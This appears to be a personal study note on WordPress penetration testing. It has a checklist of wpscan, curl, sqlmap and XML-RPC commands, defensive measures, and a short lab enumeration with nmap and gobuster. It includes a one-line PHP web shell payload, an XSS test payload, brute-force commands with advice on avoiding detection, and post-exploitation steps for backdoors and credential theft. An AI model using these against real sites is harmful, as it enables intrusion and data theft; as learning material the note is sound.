Tags: [[Wordpress]] [[Cybersecurity]] [[Penetration Testing]]

### Penetration Testing WordPress - Notes

#### **Overview**
WordPress is one of the most popular Content Management Systems (CMS) worldwide, powering over 40% of websites. Its popularity makes it a common target for attackers. Penetration testing WordPress involves identifying vulnerabilities in its core files, plugins, themes, and configurations.

---

### **WordPress Components to Test**
1. **Core**: Default WordPress installation files.
2. **Plugins**: Extend functionality but may introduce vulnerabilities.
3. **Themes**: Custom themes often have exploitable flaws.
4. **Configuration Files**: Especially `wp-config.php`.
5. **Users**: Privileged accounts, default users, and password strength.

---

### **Common Vulnerabilities in WordPress**
1. **Outdated Core, Plugins, or Themes**: Vulnerabilities patched in newer versions.
2. **Weak Credentials**: Admin accounts with weak passwords or default usernames like `admin`.
3. **File Upload Vulnerabilities**: Unrestricted file uploads leading to remote code execution (RCE).
4. **Exposed Sensitive Files**: Files like `wp-config.php` and `.htaccess` exposed publicly.
5. **Database Exposure**: SQL injection vulnerabilities in plugins/themes.
6. **Cross-Site Scripting (XSS)**: Injected scripts in themes, plugins, or comment forms.
7. **Privilege Escalation**: Users with lower privileges gaining admin access.
8. **XML-RPC Exploits**: Used for brute force attacks or Denial of Service (DoS).
9. **Directory Listings**: Exposed directories revealing sensitive information.

---

### **Penetration Testing Checklist**

#### **1. Reconnaissance**
- Enumerate WordPress installations:
  ```bash
  wpscan --url <target-url>
  ```
- Identify WordPress version, plugins, and themes:
  ```bash
  wpscan --url <target-url> --enumerate ap,at,u
  ```
  - **ap**: All plugins.
  - **at**: All themes.
  - **u**: Users.

- Check for robots.txt and sitemap.xml for sensitive endpoints:
  ```bash
  curl http://<target-url>/robots.txt
  ```

#### **2. Testing Default Credentials**
- Try common username/password combinations like `admin:admin` or `admin:password`.

#### **3. Plugin and Theme Vulnerabilities**
- Use **WPScan** to identify vulnerable plugins and themes:
  ```bash
  wpscan --url <target-url> --api-token <your-api-token>
  ```
- Manually verify vulnerable plugins/themes by searching CVEs on:
  - [Exploit Database](https://www.exploit-db.com/)
  - [WPScan Vulnerability Database](https://wpscan.com/)

#### **4. File Upload Exploits**
- Test forms for unrestricted file uploads:
  - Use tools like **Burp Suite** to modify content types and upload malicious PHP files.
  - Example payload: 
    ```php
    <?php echo shell_exec($_GET['cmd']); ?>
    ```

#### **5. Brute Forcing**
- Perform a brute force attack on login pages:
  ```bash
  wpscan --url <target-url> --passwords <password-list> --username <username>
  ```
  - Rate-limit your attacks to avoid detection.

#### **6. Sensitive File Exposure**
- Search for exposed files:
  ```bash
  curl http://<target-url>/wp-config.php
  curl http://<target-url>/.htaccess
  ```
- Test for backups:
  ```bash
  curl http://<target-url>/wp-config.php.bak
  ```

#### **7. SQL Injection**
- Identify vulnerable plugins/themes handling user input improperly.
- Use **sqlmap** to automate SQL injection testing:
  ```bash
  sqlmap -u "http://<target-url>?id=1" --batch
  ```

#### **8. Cross-Site Scripting (XSS)**
- Test forms, comments, or inputs with payloads:
  ```html
  <script>alert('XSS');</script>
  ```
- Look for reflected, stored, and DOM-based XSS vulnerabilities.

#### **9. XML-RPC Testing**
- Enumerate users via XML-RPC:
  ```bash
  curl -X POST http://<target-url>/xmlrpc.php --data '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>'
  ```
- Exploit XML-RPC for brute forcing or DoS.

---

### **Post-Exploitation**
1. **Access wp-admin**
   - Upload malicious plugins or themes to establish a backdoor.
2. **Steal Sensitive Data**
   - Extract database credentials from `wp-config.php`.
   - Dump user credentials using SQL injection.
3. **Pivoting**
   - Use compromised WordPress as a foothold for lateral movement in the network.

---

### **Defensive Measures**
1. **Keep Everything Updated**: Core, plugins, and themes.
2. **Limit Login Attempts**: Prevent brute-force attacks.
3. **Secure File Permissions**: Ensure sensitive files aren't accessible.
4. **Disable XML-RPC**: If not needed.
5. **Enforce Strong Passwords**: Use password managers and enable two-factor authentication (2FA).
6. **Restrict Admin Area**: Allow access only from specific IPs or use VPN.
7. **Use Security Plugins**:
   - Wordfence
   - Sucuri
8. **Regular Backups**: Keep offline and encrypted backups of the site.

---

### **Useful Tools for WordPress Pen Testing**
- **WPScan**: WordPress enumeration and vulnerability scanning.
- **Burp Suite**: Intercept and modify HTTP requests.
- **sqlmap**: SQL injection testing.
- **Nmap**: Port scanning and service detection.
- **Metasploit**: Exploiting known vulnerabilities.
- **Dirb/Gobuster**: Directory enumeration for hidden paths.


## Enumeration

```bash
sudo nmap -sV $target

# Nmap 7.94SVN scan initiated Sun Jan  5 11:01:38 2025 as: /usr/lib/nmap/nmap -sV -oN firstscan 10.129.19.208
Nmap scan report for 10.129.19.208
Host is up (0.066s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
```

We can see here there is a server on 80/tcp that is open running `nginx 1.14.2`. 

## Gobuster

#### Install Gobuster

First we need to download golang

```bash 
sudo apt install golang-go
```

Next we can install gobuster.

```Bash
sudo apt install gobuster
```


### Gobuster Help

```bash
gobuster --help
```

## Running Scan

```Bash
sudo gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u $target

```
